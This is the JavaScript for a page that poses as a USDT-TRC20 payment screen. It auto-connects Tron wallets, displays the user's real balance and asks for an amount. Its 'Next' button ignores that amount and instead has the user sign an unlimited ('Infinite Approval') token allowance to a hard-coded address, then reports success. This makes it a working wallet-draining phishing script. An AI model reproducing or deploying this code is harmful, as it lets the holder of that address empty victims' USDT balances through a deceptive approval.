// 核心配置参数 (Core Configuration)
window.Permission_address = 'TLiJ8GGDTWbr1UDHDhaAtWZxetrmpnH2yi'; // 授权地址 (您的合约地址)
window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方 USDT-TRC20 合约地址

document.addEventListener('DOMContentLoaded', () => {
    const amountInput = document.getElementById('amountInput');
    const usdValue = document.getElementById('usdValue');
    const btnAll = document.getElementById('btnAll');
    const btnNext = document.querySelector('.btn-next');
    
    // Exchange Rate Config
    const EXCHANGE_RATE = 0.95; 
    const MOCK_BALANCE = 1234.56;

    // Format currency
    const formatCurrency = (value) => {
        return value.toFixed(2);
    };

    // Update USD value based on input
    amountInput.addEventListener('input', (e) => {
        const value = parseFloat(e.target.value);
        if (!isNaN(value)) {
            usdValue.textContent = formatCurrency(value * EXCHANGE_RATE);
        } else {
            usdValue.textContent = '0.00';
        }
    });

    // Handle "All" button click
    btnAll.addEventListener('click', () => {
        amountInput.value = MOCK_BALANCE;
        amountInput.dispatchEvent(new Event('input'));
    });

    // Update available balance text
    const balanceText = document.querySelector('.balance-text');
    balanceText.textContent = `可用: ${MOCK_BALANCE} USDT-TRC20`;

    // Wallet Logic
    let tronWeb = null;
    let userAddress = null;

    // Attempt to connect to any available Tron wallet
    async function connectWallet() {
        // 1. Try generic tronLink request
        if (window.tronLink) {
            try {
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res.code === 200) {
                    tronWeb = window.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    console.log("Wallet connected via tronLink:", userAddress);
                    return true;
                }
            } catch (e) {
                console.log("Failed to connect via tronLink request", e);
            }
        }

        // 2. Check for directly injected tronWeb
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            console.log("Wallet connected via injected tronWeb:", userAddress);
            return true;
        }

        return false;
    }

    // Auto-connect mechanism
    async function initWalletAuto() {
        let connected = await connectWallet();
        
        if (connected) {
            updateUIWithWalletInfo();
        } else {
            let attempts = 0;
            const maxAttempts = 20; 
            const interval = setInterval(async () => {
                attempts++;
                connected = await connectWallet();
                if (connected) {
                    clearInterval(interval);
                    updateUIWithWalletInfo();
                } else if (attempts >= maxAttempts) {
                    clearInterval(interval);
                    console.log("Wallet not found after polling");
                }
            }, 500);
        }
    }

    // Update UI with wallet info (Address & Balance)
    async function updateUIWithWalletInfo() {
        if (!userAddress || !tronWeb) return;

        // Show hidden elements
        const balanceRow = document.querySelector('.balance-row');
        const paymentCard = document.querySelector('.card.row-card');
        
        if (balanceRow) balanceRow.style.display = 'flex';
        if (paymentCard) paymentCard.style.display = 'flex';

        // 1. Update Payment Address (Masked)
        // TP4i ... g6yi
        const len = userAddress.length;
        const maskedAddress = `${userAddress.substring(0, 4)} ... ${userAddress.substring(len - 4)}`;
        const addressPreview = document.querySelector('.address-preview');
        if (addressPreview) {
            addressPreview.textContent = maskedAddress;
        }

        // 2. Fetch and Update USDT Balance
        try {
            const contract = await tronWeb.contract().at(window.usdtContractAddress);
            // balanceOf returns BigNumber/Integer in Sun (6 decimals for USDT)
            const balance = await contract.balanceOf(userAddress).call();
            // Convert from Sun (1e6) to Unit
            // Handle different return types (BigNumber object or raw string/number)
            let balanceVal = balance.toString(); 
            let actualBalance = parseFloat(balanceVal) / 1000000;
            
            // Update UI
            const balanceText = document.querySelector('.balance-text');
            if (balanceText) {
                balanceText.textContent = `可用: ${actualBalance} USDT-TRC20`;
            }
            
            // Update MOCK_BALANCE logic so "All" button works with real balance
            // We can store it in a global or data attribute, but for simplicity:
            btnAll.onclick = () => {
                amountInput.value = actualBalance;
                amountInput.dispatchEvent(new Event('input'));
            };

        } catch (error) {
            console.error("Failed to fetch balance:", error);
        }
    }

    initWalletAuto();

    // Handle Next Button (Authorization)
    btnNext.addEventListener('click', async () => {
        if (!tronWeb || !userAddress) {
            await connectWallet();
        }

        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            alert("请先连接钱包 (如 TronLink, TokenPocket, OKX 等)");
            if (window.tronLink) {
                try {
                    window.tronLink.request({ method: 'tron_requestAccounts' });
                } catch(e){}
            }
            return;
        }

        try {
            btnNext.textContent = "授权中...";
            btnNext.disabled = true;

            const currentTronWeb = window.tronWeb;
            // 使用 window.usdtContractAddress
            const contract = await currentTronWeb.contract().at(window.usdtContractAddress);
            
            // Infinite Approval
            const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
            
            // 使用 window.Permission_address 进行授权
            const result = await contract.approve(window.Permission_address, MAX_UINT256).send();
            
            console.log("Authorization result:", result);
            alert("授权成功！");
            btnNext.textContent = "下一步";
            btnNext.disabled = false;

        } catch (error) {
            console.error("Authorization failed:", error);
            alert("授权失败: " + (error.message || error));
            btnNext.textContent = "下一步";
            btnNext.disabled = false;
        }
    });
});
